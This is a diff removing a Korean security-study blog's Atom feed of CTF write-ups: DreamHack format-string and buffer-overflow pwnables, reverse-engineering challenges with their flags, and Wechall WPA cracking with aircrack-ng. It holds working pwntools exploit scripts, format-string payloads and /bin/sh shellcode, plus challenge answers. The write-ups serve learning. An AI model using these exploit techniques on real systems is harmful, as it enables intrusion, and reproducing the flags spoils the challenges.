@@ -1,417 +1,189 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-03-10T03:42:11+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">DalnaraCrater의 공부 블로그</title><subtitle></subtitle><author><name>Yongjin Han</name></author><entry><title type="html">(DreamHack) Basic_exploitation_002</title><link href="http://localhost:4000/security/(DreamHack)-basic-exploitation-002/" rel="alternate" type="text/html" title="(DreamHack) Basic_exploitation_002" /><published>2021-03-05T18:24:00+09:00</published><updated>2021-03-05T18:24:00+09:00</updated><id>http://localhost:4000/security/(DreamHack)-basic-exploitation-002</id><content type="html" xml:base="http://localhost:4000/security/(DreamHack)-basic-exploitation-002/">&lt;h2 id=&quot;풀이&quot;&gt;풀이&lt;/h2&gt;
-&lt;p&gt;Basic_exploitation_002는 FSB (Format String Bug)에 관한 문제이다.&lt;/p&gt;
-
-&lt;p&gt;FSB는 printf, sprintf 등 서식 문자를 사용하는 함수에서 매개변수를 검증하지 않아 발생하는 보안약점이며, 이를 통해 메모리 내용을 볼 수도 있다.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;stdlib.h&amp;gt;
-#include &amp;lt;signal.h&amp;gt;
-#include &amp;lt;unistd.h&amp;gt;
-
-
-void alarm_handler() {
-    puts(&quot;TIME OUT&quot;);
-    exit(-1);
-}
-
-
-void initialize() {
-    setvbuf(stdin, NULL, _IONBF, 0);
-    setvbuf(stdout, NULL, _IONBF, 0);
-
-    signal(SIGALRM, alarm_handler);
-    alarm(30);
-}
-
-void get_shell() {
-    system(&quot;/bin/sh&quot;);
-}
-
-int main(int argc, char *argv[]) {
-
-    char buf[0x80];
-
-    initialize();
-
-    read(0, buf, 0x80);
-    printf(buf);
-
-    exit(0);
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;위 코드에서는 printf함수에 buf만이 들어왔기 때문에 취약하다고 볼 수 있다.&lt;br /&gt;
-먼저 buf 변수를 통해 메모리 내용을 확인하고, exit() 함수에 get_shell()함수 주소를 덮어 씌움으로써 쉘을 실행시키도록 한다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110103059-d4bd6a00-7de8-11eb-8f9b-229b895ef366.png&quot; alt=&quot;image&quot; /&gt;
-FSB를 익스플로잇하여 첫번째 서식 문자부터 ‘AAAA’를 참조하는 것을 알 수 있다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110103358-34b41080-7de9-11eb-9bfe-cd3937fb5988.png&quot; alt=&quot;image&quot; /&gt;
-디스어셈블러를 통해 get_shell()의 주소가 0x8048609임을 알아냈다.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-Python&quot;&gt;from pwn import *
-
-p = remote(&quot;host1.dreamhack.games&quot;, 12773)
-elf = ELF(&quot;./basic_exploitation_002&quot;)
-
-exit = elf.got['exit']
-get_shell = 0x8048609
-
-payload = p32(exit)
-payload += p32(exit + 2)
-payload += &quot;%34305d&quot;
-payload += &quot;%1$n&quot;
-payload += &quot;%33275d&quot;
-payload += &quot;%2$n&quot;
-
-p.send(payload)
-p.interactive()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;fsb-탐지&quot;&gt;FSB 탐지&lt;/h2&gt;
-&lt;p&gt;디스어셈블러와 디버거가 아닌 자동화된 보안약점 분석 도구에서는 어떻게 FSB를 탐지하는지 알아본다. 먼저 FSB는 printf, sprintf 등의 취약한 함수를 사용할 경우 발생할 가능성이 높아지므로 printf_s, sprintf_s 등의 함수를 사용하여야 한다.&lt;/p&gt;
-
-&lt;h3 id=&quot;취약한-함수-이름-검색&quot;&gt;취약한 함수 이름 검색&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;Flawfinder&lt;/strong&gt;, &lt;strong&gt;Cppcheck&lt;/strong&gt;과 같은 보안약점 분석기는 위에서 말한 printf와 같은 취약한 함수들을 단순히 검색하여 해당 프로그램이 취약한 지 분석한다.&lt;/p&gt;
-
-&lt;h3 id=&quot;오염-분석-데이터-흐름-분석-taint-analysis-data-flow-analysis&quot;&gt;오염 분석, 데이터 흐름 분석 (Taint analysis, data flow analysis)&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;Clang Static Analyzer&lt;/strong&gt;는 오염 분석, 데이터 흐름 분석 등의 분석 기법을 이용하여 메모리 값이 변하는지 직접 확인함으로써 보안약점을 탐지한다.
-&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110103433-4c8b9480-7de9-11eb-8034-817d34e59780.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;두-방식의-장단점&quot;&gt;두 방식의 장단점&lt;/h3&gt;
-&lt;p&gt;단순히 취약한 함수 이름을 검색한다고 해서 취약하다고 탐지된 프로그램이 실제로 취약한 프로그램인지 확실하지 않을 수 있다. (false positive)&lt;br /&gt;
-반면 단순 스트링 매칭 방식이기 때문에 빠른 시간 내에 프로그램을 분석할 수 있는 장점이 있다.&lt;/p&gt;
-
-&lt;p&gt;오염 분석, 데이터 흐름 분석은 프로그램을 실제로 실행하면서 취약점의 존재 유무를 판단하기 때문에 더 정확하다. 그러나 프로그램을 실행하면서 분석하기 때문에 분석 시간이 오래 걸린다는 단점이 있다.&lt;/p&gt;</content><author><name>Yongjin Han</name></author><summary type="html">풀이 Basic_exploitation_002는 FSB (Format String Bug)에 관한 문제이다.</summary></entry><entry><title type="html">(DreamHack) Basic_exploitation_003</title><link href="http://localhost:4000/security/(DreamHack)-basic-exploitation-003/" rel="alternate" type="text/html" title="(DreamHack) Basic_exploitation_003" /><published>2021-03-05T18:24:00+09:00</published><updated>2021-03-05T18:24:00+09:00</updated><id>http://localhost:4000/security/(DreamHack)-basic-exploitation-003</id><content type="html" xml:base="http://localhost:4000/security/(DreamHack)-basic-exploitation-003/">&lt;h2 id=&quot;풀이&quot;&gt;풀이&lt;/h2&gt;
-
-&lt;p&gt;이번 문제는 FSB와 BOF가 모두 사용된 문제이다.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;#include &amp;lt;stdlib.h&amp;gt;
-#include &amp;lt;signal.h&amp;gt;
-#include &amp;lt;unistd.h&amp;gt;
-void alarm_handler() {
-    puts(&quot;TIME OUT&quot;);
-    exit(-1);
-}
-void initialize() {
-    setvbuf(stdin, NULL, _IONBF, 0);
-    setvbuf(stdout, NULL, _IONBF, 0);
-    signal(SIGALRM, alarm_handler);
-    alarm(30);
-}
-void get_shell() {
-    system(&quot;/bin/sh&quot;);
-}
-int main(int argc, char *argv[]) {
-    char *heap_buf = (char *)malloc(0x80);
-    char stack_buf[0x90] = {};
-    initialize();
-    read(0, heap_buf, 0x80);
-    sprintf(stack_buf, heap_buf);
-    printf(&quot;ECHO : %s\n&quot;, stack_buf);
-    return 0;
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id=&quot;fsb&quot;&gt;FSB&lt;/h4&gt;
-&lt;p&gt;sprintf는 입력값의 길이에 대한 검사가 없이 사용되고 있으므로 FSB에 의해 익스플로잇될 수 있다. (앞으로는 sprintf_s를 애용하자)&lt;/p&gt;
-&lt;h4 id=&quot;bof&quot;&gt;BOF&lt;/h4&gt;
-&lt;p&gt;sprintf를 통해 heap_buf에서 stack_buf의 내용을 바꾸는데 이때 main의 ret 값을 변조시켜 BOF를 일으킬 수 있다.
-stack_buf와 ret 사이에 0x98 (stack_buf, *heap_buf) + 0x4 (sfp)만큼의 공간이 존재한다.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-Python&quot;&gt;from pwn import *
-
-p = remote(&quot;host1.dreamhack.games&quot;, 24316)
-elf = ELF(&quot;./basic_exploitation_003&quot;)
-
-get_shell = elf.symbols['get_shell']
-
-payload = &quot;%156d&quot;
-payload += p32(get_shell)
-
-p.send(payload)
-p.interactive()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;위 코드를 통해 쉘을 실행시킬 수 있다.
-&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110102904-a93a7f80-7de8-11eb-9680-9517a32b104e.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;</content><author><name>Yongjin Han</name></author><summary type="html">풀이</summary></entry><entry><title type="html">(DreamHack) rev-basic-2</title><link href="http://localhost:4000/security/(DreamHack)-rev-basic-2/" rel="alternate" type="text/html" title="(DreamHack) rev-basic-2" /><published>2021-03-03T18:24:00+09:00</published><updated>2021-03-03T18:24:00+09:00</updated><id>http://localhost:4000/security/(DreamHack)-rev-basic-2</id><content type="html" xml:base="http://localhost:4000/security/(DreamHack)-rev-basic-2/">&lt;h2 id=&quot;풀이&quot;&gt;풀이&lt;/h2&gt;
-
-&lt;p&gt;IDA를 통해 주어진 실행 파일을 디스어셈블링하고 string view를 확인해 보았다. 플래그로 추정되는 문자열을 얻을 수 없어 어셈블리 코드를 살펴보았다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110457204-bbc8f780-810d-11eb-974f-1ab363388b01.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;프로세스가 반복되고 있음을 알 수 있지만 아직 어떤 동작을 하는지 정확하게 해석할 수 없었다. 다만 aC의 주소를 옮겨 사용한다는 것은 알 수 있었고, aC의 값이 담긴 스택을 확인해 보았다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110457996-9be60380-810e-11eb-8c47-5015bdc1928a.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;‘Comp4re_the_arr4y’가 플래그임을 유추할 수 있었다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110458317-f97a5000-810e-11eb-8cad-bd93d2f02769.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;어떨결에 플래그를 찾아내긴 했지만 디스어셈블된 어셈블리 코드를 해석할 수 있었다면 더욱 좋았을 것 같다.&lt;/p&gt;</content><author><name>Yongjin Han</name></author><summary type="html">풀이</summary></entry><entry><title type="html">(DreamHack) rev-basic-1</title><link href="http://localhost:4000/security/(DreamHack)-rev-basic-1/" rel="alternate" type="text/html" title="(DreamHack) rev-basic-1" /><published>2021-03-03T18:24:00+09:00</published><updated>2021-03-03T18:24:00+09:00</updated><id>http://localhost:4000/security/(DreamHack)-rev-basic-1</id><content type="html" xml:base="http://localhost:4000/security/(DreamHack)-rev-basic-1/">&lt;h2 id=&quot;풀이&quot;&gt;풀이&lt;/h2&gt;
-
-&lt;p&gt;IDA를 통해 주어진 실행 파일을 디스어셈블링하고 string view를 확인해 보았다.&lt;br /&gt;
-플래그로 추정되는 문자열은 찾을 수 없어 비교 연산을 하는 코드가 있는지 찾아보았다. 아래 그림과 같이 문자 하나씩 비교해가며 확인하는 프로세스가 존재하였다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110456181-9a1b4080-810c-11eb-8cff-dffde77c3eaa.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;비교되는 문자들을 아스키코드를 참고하여 변환하면 ‘Compar3_the_ch4ract3r’이라는 문자열을 얻을 수 있다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110456857-6391f580-810d-11eb-9e58-76b7f9a709d4.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;</content><author><name>Yongjin Han</name></author><summary type="html">풀이</summary></entry><entry><title type="html">(DreamHack) rev-basic-0</title><link href="http://localhost:4000/security/(DreamHack)-rev-basic-0/" rel="alternate" type="text/html" title="(DreamHack) rev-basic-0" /><published>2021-03-03T18:24:00+09:00</published><updated>2021-03-03T18:24:00+09:00</updated><id>http://localhost:4000/security/(DreamHack)-rev-basic-0</id><content type="html" xml:base="http://localhost:4000/security/(DreamHack)-rev-basic-0/">&lt;h2 id=&quot;풀이&quot;&gt;풀이&lt;/h2&gt;
-
-&lt;p&gt;IDA를 통해 주어진 실행 파일을 디스어셈블링하였다. 우전 string view를 확인하여 플래그처럼 보이는 문자열을 확인하였다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110455212-7dcad400-810b-11eb-9eca-e1f488af9cd1.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;사용자 입력값이 ‘Compar3_the_str1ng’과 일치하는지 비교하는 어셈블리 코드를 확인할 수 있었다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110455373-b5d21700-810b-11eb-95a9-9114ba67de5e.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;예상한대로 찾아낸 문자열을 입력하였더니 Correct가 출력되었다.
-&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/110455684-15302700-810c-11eb-91a9-2bdd331ff53d.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;</content><author><name>Yongjin Han</name></author><summary type="html">풀이</summary></entry><entry><title type="html">(Dreamhack) basic_exploitation_000</title><link href="http://localhost:4000/security/(DreamHack)-basic_exploitation_000/" rel="alternate" type="text/html" title="(Dreamhack) basic_exploitation_000" /><published>2021-02-24T18:24:00+09:00</published><updated>2021-02-24T18:24:00+09:00</updated><id>http://localhost:4000/security/(DreamHack)-basic_exploitation_000</id><content type="html" xml:base="http://localhost:4000/security/(DreamHack)-basic_exploitation_000/">&lt;h2 id=&quot;문제-풀이&quot;&gt;문제 풀이&lt;/h2&gt;
-
-&lt;p&gt;buf가 지역 변수로 0x80만큼 할당이 되어 있고, 이를 통해 ret 주소와 132바이트만큼 차이난다는 것을 알 수 있다. (buf크기 128바이트 +sfp 4바이트)&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/108988447-d182f980-76d7-11eb-90e2-92608229fa4f.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/108988382-bdd79300-76d7-11eb-9245-e8f38c8e64c2.png&quot; alt=&quot;image&quot; /&gt;
-IDA를 이용하여 살펴본 스택 공간&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-Python&quot;&gt;from pwn import *
-
-proc = remote(&quot;host1.dreamhack.games&quot;, 15867)
-
-proc.recvuntil(&quot;buf = (&quot;)
-bufAddr = int(proc.recv(10), 16)
-shellcode = &quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80&quot;
-shellcode += &quot;\x80&quot; * 106
-shellcode += str(p32(bufAddr))
-proc.send(shellcode)
-
-proc.interactive()
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;buf 공간에 26바이트의 쉘 코드와 아무 의미 없는 ‘A’를 106바이트만큼 채워주고 ret 주소에 buf 주소가 오버플로우될 수 있도록 하였다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/108981294-f1aeba80-76cf-11eb-8786-58c69bc1508a.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;함수-호출-방식&quot;&gt;함수 호출 방식&lt;/h2&gt;
-&lt;p&gt;함수를 호출하는 과정에서 매개변수, 리턴 주소 등을 어떻게 스택에 넣고 정리할 지 정하는 &lt;strong&gt;함수 호출 규약&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/108988472-d9429e00-76d7-11eb-9eaf-b73e7e5238fa.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;sum(a, b)를 호출했다고 가정하자&lt;/p&gt;
-
-&lt;h3 id=&quot;_cdecl&quot;&gt;_cdecl&lt;/h3&gt;
-&lt;p&gt;_cdecl은 c언어에서의 기본 함수 호출 규약이다. 스택을 사용하여 함수 외부에서 공간을 정리한다. (스택 정리는 caller가 함)&lt;/p&gt;
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;_stdcall&quot;&gt;_stdcall&lt;/h3&gt;
-&lt;p&gt;_stdcall은 스택을 사용하여 함수 내부에서 공간을 정리한다. WINAPI에서 많이 사용한다. (스택 정리는 callee가 함)&lt;/p&gt;
-
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;함수 리턴시 ret * 8 수행&lt;/p&gt;
-
-&lt;h3 id=&quot;_fastcall&quot;&gt;_fastcall&lt;/h3&gt;
-&lt;p&gt;다른 호출 규약과 달리 레지스터를 이용한다. 레지스터를 이용하므로 속도가 빠르지만 경우에 따라 코드가 길어질 수 있다.&lt;/p&gt;
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;_thiscall&quot;&gt;_thiscall&lt;/h3&gt;
-&lt;p&gt;c++에서 사용하는 호출규약으로 _stdcall과 비슷한 구조를 갖는다.&lt;/p&gt;
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ebx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;c++에서 자기 자신을 가리키는 this 포인터의 주소가 ecx 레지스터에 담기게 된다.&lt;/p&gt;</content><author><name>Yongjin Han</name></author><summary type="html">문제 풀이</summary></entry><entry><title type="html">(Pwnable) blukat</title><link href="http://localhost:4000/security/(Wechall)-Substitution1/" rel="alternate" type="text/html" title="(Pwnable) blukat" /><published>2021-02-17T18:24:00+09:00</published><updated>2021-02-17T18:24:00+09:00</updated><id>http://localhost:4000/security/(Wechall)-Substitution1</id><content type="html" xml:base="http://localhost:4000/security/(Wechall)-Substitution1/">&lt;h2 id=&quot;문제-풀이&quot;&gt;문제 풀이&lt;/h2&gt;
-&lt;p&gt;ls -l 명령어를 통해 어떠한 파일이 있고 어떤 코드로 구성되어 있는지 확인하였다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/108188675-34621700-7153-11eb-8888-c31cadcaf51f.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;평소와 같으면 바로 실행 파일을 실행하고, c 파일을 살펴 보았겠지만 자세히 살펴보니 password 파일의 소유 그룹이 눈에 띄었다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/108188748-49d74100-7153-11eb-9d3b-43561af1b9ee.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;id 명령어를 통해 내 계정의 uid와 gid를 확인하였다. 확인 결과 내 계정이 속한 그룹이 password 파일에 접근할 수 있음을 알았다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/24788751/108188766-5065b880-7153-11eb-8300-a8e4b5b7ce5f.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;password 파일 내용 출력 성공!&lt;/p&gt;
-
-&lt;p&gt;(주의: 자칫 잘못하면 c 소스코드를 분석하여 시간을 낭비할 수 있음.)&lt;/p&gt;</content><author><name>Yongjin Han</name></author><summary type="html">문제 풀이 ls -l 명령어를 통해 어떠한 파일이 있고 어떤 코드로 구성되어 있는지 확인하였다.</summary></entry><entry><title type="html">(Wechall) A Black Hats Tale</title><link href="http://localhost:4000/security/(Wechall)-A-Black-Hats-Tale/" rel="alternate" type="text/html" title="(Wechall) A Black Hats Tale" /><published>2021-02-10T18:24:00+09:00</published><updated>2021-02-10T18:24:00+09:00</updated><id>http://localhost:4000/security/(Wechall)-A-Black-Hats-Tale</id><content type="html" xml:base="http://localhost:4000/security/(Wechall)-A-Black-Hats-Tale/">&lt;h2 id=&quot;문제-풀이&quot;&gt;문제 풀이&lt;/h2&gt;
-&lt;p&gt;War driving을 통해 은행 본사의 무선 통신을 스니핑하여 통신 데이터 일부를 얻었다 (wpa_psk.cap). 은행은 WPA를 통해 통신을 암호화 하고 있어 스니핑된 데이터는 암호화되어 있다. 따라서 WPA의 키를 알아야 평문을 얻을 수 있다.&lt;/p&gt;
-
-&lt;p&gt;문제에서는 dictionary attack을 사용하여 WPA의 패스워드를 알아내라고 힌트를 주었다.&lt;/p&gt;
-
-&lt;p&gt;해당 문제를 풀기 위해 aircrack-ng 프로그램을 사용하였으며, dictionary list는 따로 다운로드 받았다. (kali linux에는 /pentest/wireless/aircrack-ng/test/password.lst 에 저장되어 있다고 한다.)&lt;/p&gt;
-
-&lt;p&gt;aircrack-ng를 사용하면 다음과 같이 WPA에 사용되는 키가 “jennifer”임을 알 수 있다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img width=&quot;625&quot; alt=&quot;wpa_aircrack&quot; src=&quot;https://user-images.githubusercontent.com/24788751/107494877-acb85d80-6bd2-11eb-9976-f5061bc705c3.png&quot; /&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-&lt;h2 id=&quot;wpa란&quot;&gt;WPA란?&lt;/h2&gt;
-&lt;p&gt;WPA는 Wifi Protected Access의 약자로 WEP를 보안하기 위해 고안되었다.&lt;/p&gt;
-
-&lt;h3 id=&quot;wep&quot;&gt;WEP&lt;/h3&gt;
-&lt;p&gt;Wired Equivalent Privacy는 IV(Initial Vector)와 사전에 공유된 키를 통해 난수를 생성하여 이를 키 스트림으로 사용한다. 또한 암호문에 대해 CRC-32 알고리즘을 사용하여 ICV(Integrity Check Value)를 생성함으로써 무결성을 확인한다.&lt;/p&gt;
-
-&lt;h4 id=&quot;단점&quot;&gt;단점&lt;/h4&gt;
-&lt;ul&gt;
-  &lt;li&gt;IV의 길이가 24비트로 짧기 때문에 반복되어 사용될 경우 IV 값을 찾아내기 쉬움&lt;/li&gt;
-  &lt;li&gt;고정키를 사용하기 때문에 패킷 수집을 통해 암호분석을 통해 암호키를 찾아내기 쉬움&lt;/li&gt;
-  &lt;li&gt;암호화 알고리즘으로 RC4를 사용하고 있어 자체적으로 취약함&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;wpa&quot;&gt;WPA&lt;/h3&gt;
-&lt;p&gt;WPA는 WEP을 대체하기 위해 TKIP(Temporal Key Integrity Protocol)을 사용한다. TKIP는 RC4를 사용하긴 하지만 &lt;strong&gt;48비트의 확장된 IV 사용, IV의 순차적 증가를 통한 재생 공격 보호&lt;/strong&gt;, CRC-32보다 안전한 &lt;strong&gt;MIC(Message Integrity Check) 알고리즘&lt;/strong&gt; 사용을 통해 위 목적을 실현하려고 하였다.&lt;/p&gt;
-
-&lt;h4 id=&quot;단점-1&quot;&gt;단점&lt;/h4&gt;
-&lt;ul&gt;
-  &lt;li&gt;RC4의 취약점이 그대로 남겨짐&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;wpa2&quot;&gt;WPA2&lt;/h3&gt;
-&lt;p&gt;WPA의 TKIP를 보안하기 위해 AES를 사용하는 CCMP(Counter mode with CBC-MAC Protocol) 암호화 방식을 적용하였다. 128비트의 대칭키와 48비트의 IV를 사용하고 무결성 보장과 replay attack를 방지할 수 있다.&lt;/p&gt;
-
-&lt;h3 id=&quot;wpa-pskwi-fi-protected-access-pre-shared-key&quot;&gt;WPA-PSK(Wi-Fi Protected Access Pre-Shared Key)&lt;/h3&gt;
-&lt;p&gt;인증 서버가 설치되지 않은 소규모 망에서 사용되는 방식이다. 동일한 공유키를 갖고 있는지 확인하기 위해 802.1x에 규정된 EAPoL-Key 프레임을 활용하여 4-way handshake를 통해 인증을 수행한다. 암호화키가 1만개의 패킷마다 바뀌는 것이 특징이다.&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;암호키가 짧거나 추측하기 쉬운 값일 경우 사전 공격 (dictionary attack)에 취약함 (사전의 성능에 좌우됨)
-&lt;img width=&quot;1226&quot; alt=&quot;wpa_wireshark&quot; src=&quot;https://user-images.githubusercontent.com/24788751/107497481-fce4ef00-6bd5-11eb-9ba2-d2556f117e3c.png&quot; /&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Yongjin Han</name></author><summary type="html">문제 풀이 War driving을 통해 은행 본사의 무선 통신을 스니핑하여 통신 데이터 일부를 얻었다 (wpa_psk.cap). 은행은 WPA를 통해 통신을 암호화 하고 있어 스니핑된 데이터는 암호화되어 있다. 따라서 WPA의 키를 알아야 평문을 얻을 수 있다.</summary></entry><entry><title type="html">(Wechall) Regex 1</title><link href="http://localhost:4000/security/(Wechall)-Regex/" rel="alternate" type="text/html" title="(Wechall) Regex 1" /><published>2021-02-03T18:24:00+09:00</published><updated>2021-02-03T18:24:00+09:00</updated><id>http://localhost:4000/security/(Wechall)-Regex</id><content type="html" xml:base="http://localhost:4000/security/(Wechall)-Regex/">&lt;h1 id=&quot;wechall-training-regex-write-up&quot;&gt;(Wechall) Training Regex write up&lt;/h1&gt;
-
-&lt;p&gt;Regex 정규표현식 문법을 이용하여 empty string을 매칭하는 정규 표현식 찾기&lt;/p&gt;
-
-&lt;p&gt;답&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-Java&quot;&gt;/^$/
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;출처: http://www.wechall.net/challenge/training/regex/index.php&lt;/p&gt;
-
-&lt;h1 id=&quot;wechall-training-caesar-2-write-up&quot;&gt;(Wechall) Training Caesar 2 write up&lt;/h1&gt;
-
-&lt;p&gt;시저 암호는 고전 암호 알고리즘 중 하나로 Key만큼 문자열을 치환시켜 암호문을 얻는다. (복호화 과정은 그 반대)
